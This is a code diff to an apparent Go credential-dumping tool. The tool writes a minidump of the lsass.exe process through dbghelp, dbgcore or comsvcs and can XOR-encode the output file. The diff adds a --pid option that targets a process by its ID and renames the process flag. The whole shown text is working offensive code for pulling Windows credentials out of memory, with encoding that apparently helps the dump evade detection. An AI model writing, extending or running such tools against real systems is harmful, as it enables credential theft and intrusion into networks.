@@ -21,6 +21,7 @@ var (
 	outfile string
 	process string
 	method  string
+	pid     int
 	xorInt  int
 	xorByte byte
 )
@@ -28,14 +29,19 @@ var (
 func init() {
 	flag.StringVar(&infile, "in", "", "Input file to Xor")
 	flag.StringVar(&outfile, "out", "minidump.dmp", "minidump outfile")
-	flag.StringVar(&process, "p", "lsass.exe", "Process to dump")
+	flag.StringVar(&process, "process", "lsass.exe", "Process to dump")
 	flag.StringVar(&method, "m", "dbghelp", "[ dbghelp | dbgcore | comsvcs ]")
+	flag.IntVar(&pid, "pid", 0, "PID of process. Takes precedence over --process")
 	flag.IntVar(&xorInt, "x", 0x00, "Single Byte Xor Key")
 	xorByte = byte(xorInt)
 	flag.Parse()
 }
 
 func main() {
+	var (
+		dumpdata []byte
+		err      error
+	)
 
 	if infile != "" {
 		xorFileData, err := os.ReadFile(infile)
@@ -52,7 +58,11 @@ func main() {
 		os.Exit(0)
 	}
 
-	dumpdata, err := miniDump(outfile, process, 0)
+	if pid != 0 {
+		dumpdata, err = miniDump(outfile, "", uint32(pid))
+	} else {
+		dumpdata, err = miniDump(outfile, process, 0)
+	}
 	if err != nil {
 		fmt.Println(err)
 		os.Exit(1)
